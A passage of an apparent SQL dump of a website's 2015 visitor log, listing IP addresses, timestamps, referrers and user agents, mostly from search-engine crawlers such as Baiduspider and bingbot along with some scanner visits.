+http://www.baidu.com/search/spider.html)'),(1202,'157.55.39.42','2015-09-02','03:22:27','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1203,'42.87.223.198','2015-09-02','04:35:00','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1204,'113.229.194.205','2015-09-02','04:39:50','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1205,'119.116.199.239','2015-09-02','05:00:38','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1206,'180.76.15.14','2015-09-02','05:36:00','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1207,'180.76.15.20','2015-09-02','05:37:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1208,'141.212.122.82','2015-09-02','06:13:15','','Mozilla/5.0 zgrab/0.x'),(1209,'180.76.15.9','2015-09-02','06:14:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1210,'180.76.15.6','2015-09-02','06:15:24','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1211,'180.76.15.28','2015-09-02','07:12:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1212,'180.76.15.145','2015-09-02','07:13:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1213,'180.76.15.7','2015-09-02','07:51:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1214,'180.76.15.154','2015-09-02','08:53:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1215,'180.76.15.10','2015-09-02','08:54:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1216,'52.88.58.229','2015-09-02','09:37:57','',''),(1217,'141.212.122.90','2015-09-02','12:42:25','','Mozilla/5.0 zgrab/0.x'),(1218,'180.76.15.148','2015-09-02','12:56:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1219,'180.76.15.19','2015-09-02','12:57:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1220,'180.76.15.31','2015-09-02','13:44:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1221,'180.76.15.141','2015-09-02','15:17:23','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1222,'180.76.15.24','2015-09-02','15:18:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1223,'157.55.39.199','2015-09-02','15:37:15','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1224,'180.76.15.155','2015-09-02','15:53:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1225,'180.76.15.26','2015-09-02','15:54:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1226,'180.76.15.17','2015-09-02','16:48:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1227,'180.76.15.152','2015-09-02','16:49:29','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1228,'180.76.15.156','2015-09-02','17:42:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1229,'119.114.213.30','2015-09-02','18:37:53','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1230,'180.76.15.13','2015-09-02','18:54:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1231,'180.76.15.142','2015-09-02','18:55:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1232,'42.87.209.53','2015-09-02','18:58:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1233,'180.76.15.143','2015-09-02','19:43:00','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1234,'180.76.15.158','2015-09-02','20:54:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1235,'141.212.122.122','2015-09-02','21:01:34','','Mozilla/5.0 zgrab/0.x'),(1236,'60.23.64.225','2015-09-02','21:20:12','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1237,'180.76.15.32','2015-09-02','21:49:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1238,'180.76.15.18','2015-09-02','22:49:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1239,'157.55.39.11','2015-09-02','22:54:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1240,'180.76.15.23','2015-09-02','23:39:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1241,'157.55.39.240','2015-09-03','00:43:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1242,'180.76.15.159','2015-09-03','00:53:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1243,'218.24.220.40','2015-09-03','00:54:34','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1244,'180.76.15.158','2015-09-03','00:55:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1245,'207.46.13.26','2015-09-03','01:30:29','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1246,'180.76.15.153','2015-09-03','01:46:25','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1247,'180.76.15.23','2015-09-03','01:47:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1248,'113.229.201.198','2015-09-03','02:54:05','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1249,'180.76.15.163','2015-09-03','03:07:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1250,'180.76.15.149','2015-09-03','03:08:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1251,'91.207.60.31','2015-09-03','03:15:32','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(1252,'182.118.45.228','2015-09-03','03:19:57','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1253,'180.76.15.143','2015-09-03','04:08:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1254,'180.76.15.16','2015-09-03','04:09:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1255,'61.228.91.226','2015-09-03','04:28:26','',''),(1256,'180.76.15.25','2015-09-03','05:05:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1257,'180.76.15.161','2015-09-03','05:05:55','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1258,'180.76.15.157','2015-09-03','05:46:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1259,'180.76.15.151','2015-09-03','05:47:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1260,'157.55.39.11','2015-09-03','05:52:18','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1261,'182.118.53.225','2015-09-03','07:04:42','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1262,'180.76.15.154','2015-09-03','07:43:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1263,'180.76.15.140','2015-09-03','07:44:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1264,'180.76.15.142','2015-09-03','08:49:38','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1265,'180.76.15.14','2015-09-03','08:50:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1266,'180.76.15.18','2015-09-03','09:15:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1267,'192.99.150.120','2015-09-03','10:01:06','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(1268,'180.76.15.139','2015-09-03','10:50:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1269,'180.76.15.33','2015-09-03','12:56:38','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1270,'180.76.15.145','2015-09-03','12:58:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1271,'157.55.39.212','2015-09-03','13:10:10','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1272,'180.76.15.13','2015-09-03','13:55:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1273,'180.76.15.11','2015-09-03','13:56:36','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1274,'180.76.15.29','2015-09-03','15:15:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1275,'180.76.15.12','2015-09-03','15:16:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1276,'180.76.15.26','2015-09-03','15:49:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1277,'95.91.46.111','2015-09-03','15:58:10','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1278,'180.76.15.136','2015-09-03','17:38:42','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1279,'180.76.15.32','2015-09-03','18:52:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1280,'180.76.15.138','2015-09-03','18:54:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1281,'180.76.15.22','2015-09-03','19:53:08','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1282,'180.76.15.162','2015-09-03','19:54:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1283,'157.55.39.13','2015-09-03','20:43:54','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1284,'180.76.15.150','2015-09-03','20:53:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1285,'180.76.15.146','2015-09-03','21:11:55','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1286,'195.154.165.177','2015-09-03','22:45:08','','Mozilla/5.0 (Windows NT 5.1)'),(1287,'157.55.39.213','2015-09-03','22:46:28','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1288,'207.46.13.2','2015-09-03','22:46:34','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1289,'180.76.15.28','2015-09-03','22:48:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1290,'180.76.15.6','2015-09-04','00:54:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1291,'180.76.15.143','2015-09-04','00:55:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1292,'180.76.15.141','2015-09-04','02:05:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1293,'180.76.15.154','2015-09-04','02:06:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1294,'180.76.15.8','2015-09-04','03:46:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1295,'180.76.15.23','2015-09-04','03:47:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1296,'180.76.15.11','2015-09-04','05:22:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1297,'180.76.15.159','2015-09-04','05:23:56','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1298,'180.76.15.156','2015-09-04','05:59:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1299,'180.76.15.5','2015-09-04','06:00:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1300,'180.76.15.17','2015-09-04','06:42:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1301,'180.76.15.15','2015-09-04','07:44:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1302,'180.76.15.142','2015-09-04','07:45:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1303,'94.22.47.242','2015-09-04','08:03:24','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1304,'180.76.15.157','2015-09-04','09:43:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1305,'180.76.15.155','2015-09-04','10:50:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1306,'180.76.15.147','2015-09-04','10:51:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1307,'207.46.13.2','2015-09-04','11:00:04','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1308,'192.99.159.21','2015-09-04','11:10:17','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1309,'180.76.15.16','2015-09-04','11:39:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1310,'180.76.15.13','2015-09-04','13:00:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1311,'180.76.15.158','2015-09-04','13:48:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1312,'157.55.39.194','2015-09-04','13:51:23','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1313,'180.76.15.145','2015-09-04','14:41:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1314,'180.76.15.148','2015-09-04','15:36:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1315,'180.76.15.149','2015-09-04','15:36:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1316,'180.76.15.19','2015-09-04','16:00:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1317,'121.42.210.61','2015-09-04','18:55:42','',''),(1318,'60.23.64.208','2015-09-04','18:57:11','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1319,'42.87.109.88','2015-09-04','19:00:12','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1320,'42.57.60.203','2015-09-04','19:05:02','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1321,'54.206.37.78','2015-09-04','19:12:05','http://www.hope4harlie.com/','WWW-Mechanize/1.74'),(1322,'141.212.122.194','2015-09-04','19:42:27','','Mozilla/5.0 zgrab/0.x'),(1323,'180.76.15.34','2015-09-04','19:44:00','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1324,'207.46.13.162','2015-09-04','20:23:34','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1325,'112.221.70.78','2015-09-04','20:36:03','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12'),(1326,'180.76.15.30','2015-09-04','20:54:41','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1327,'218.24.217.15','2015-09-04','21:23:31','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1328,'42.57.60.83','2015-09-04','21:34:58','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1329,'111.248.117.214','2015-09-04','21:42:26','',''),(1330,'123.186.251.93','2015-09-04','23:23:21','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1331,'61.231.0.94','2015-09-04','23:38:15','',''),(1332,'207.46.13.162','2015-09-05','00:40:02','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1333,'180.76.15.30','2015-09-05','00:55:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1334,'180.76.15.143','2015-09-05','00:56:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1335,'198.50.200.143','2015-09-05','01:19:09','http://pizza-tycoon.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(1336,'180.76.15.29','2015-09-05','01:47:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1337,'180.76.15.7','2015-09-05','01:48:13','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1338,'85.25.103.119','2015-09-05','02:05:33','http://hundejo.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(1339,'180.76.15.158','2015-09-05','03:04:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1340,'182.118.55.135','2015-09-05','03:46:18','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1341,'180.76.15.157','2015-09-05','05:04:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1342,'180.76.15.10','2015-09-05','05:05:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1343,'180.76.15.13','2015-09-05','05:47:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1344,'180.76.15.34','2015-09-05','05:47:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1345,'180.76.15.148','2015-09-05','05:48:13','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1346,'180.76.15.142','2015-09-05','05:48:13','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1347,'180.76.15.15','2015-09-05','06:50:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1348,'180.76.15.22','2015-09-05','06:50:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1349,'180.76.15.16','2015-09-05','07:41:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1350,'182.118.53.186','2015-09-05','08:30:01','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1351,'180.76.15.136','2015-09-05','08:49:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1352,'180.76.15.32','2015-09-05','08:50:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1353,'180.76.15.135','2015-09-05','10:51:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1354,'180.76.15.24','2015-09-05','11:39:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1355,'180.76.15.27','2015-09-05','12:08:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1356,'180.76.15.160','2015-09-05','13:46:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1357,'180.76.15.162','2015-09-05','13:47:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1358,'93.174.93.33','2015-09-05','14:47:12','',''),(1359,'180.76.15.8','2015-09-05','15:12:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1360,'180.76.15.156','2015-09-05','15:52:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1361,'180.76.15.26','2015-09-05','15:53:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1362,'180.76.15.161','2015-09-05','16:53:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1363,'180.76.15.23','2015-09-05','16:55:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1364,'180.76.15.5','2015-09-05','17:42:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1365,'207.46.13.180','2015-09-05','17:46:13','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1366,'142.54.165.138','2015-09-05','17:50:07','','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)'),(1367,'113.229.199.110','2015-09-05','18:38:35','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1368,'65.55.210.34','2015-09-05','18:47:17','http://www.jubinna.com/bbs/board.php?bo_table=mission_01&wr_id=5','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b'),(1369,'113.229.207.227','2015-09-05','18:52:40','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1370,'60.23.66.154','2015-09-05','18:53:59','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1371,'113.229.200.250','2015-09-05','18:57:53','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1372,'180.76.15.152','2015-09-05','20:56:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1373,'180.76.15.144','2015-09-05','23:40:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1374,'51.254.97.22','2015-09-06','00:52:01','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1375,'180.76.15.137','2015-09-06','00:54:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1376,'180.76.15.32','2015-09-06','00:56:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1377,'207.46.13.180','2015-09-06','00:58:50','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1378,'140.207.253.146','2015-09-06','01:21:32','','compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html'),(1379,'180.76.15.152','2015-09-06','01:48:41','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1380,'180.76.15.9','2015-09-06','01:49:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1381,'180.76.15.10','2015-09-06','03:54:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1382,'180.76.15.153','2015-09-06','03:55:41','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1383,'180.76.15.139','2015-09-06','05:06:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1384,'180.76.15.19','2015-09-06','05:07:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1385,'180.76.15.158','2015-09-06','06:16:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1386,'180.76.15.141','2015-09-06','06:18:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1387,'180.76.15.31','2015-09-06','06:55:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1388,'180.76.15.15','2015-09-06','07:41:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1389,'180.76.15.30','2015-09-06','07:42:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1390,'157.55.39.94','2015-09-06','08:25:08','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1391,'207.46.13.162','2015-09-06','08:25:21','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1392,'111.248.60.2','2015-09-06','08:41:09','',''),(1393,'180.76.15.148','2015-09-06','09:42:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1394,'180.76.15.150','2015-09-06','09:43:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1395,'93.63.88.184','2015-09-06','12:07:49','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1396,'180.76.15.22','2015-09-06','12:44:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1397,'180.76.15.155','2015-09-06','13:45:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1398,'180.76.15.21','2015-09-06','13:46:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1399,'180.76.15.163','2015-09-06','15:24:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1400,'195.154.165.177','2015-09-06','15:28:09','','Mozilla/5.0 (Windows NT 5.1)'),(1401,'93.174.93.33','2015-09-06','15:31:13','',''),(1402,'180.76.15.16','2015-09-06','16:16:36','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1403,'180.76.15.147','2015-09-06','16:17:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1404,'180.76.15.162','2015-09-06','16:57:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1405,'180.76.15.14','2015-09-06','16:58:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1406,'180.76.15.157','2015-09-06','17:43:25','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1407,'218.24.221.61','2015-09-06','18:49:35','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1408,'119.114.211.98','2015-09-06','18:50:47','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1409,'180.76.15.23','2015-09-06','18:54:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1410,'180.76.15.12','2015-09-06','19:40:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; 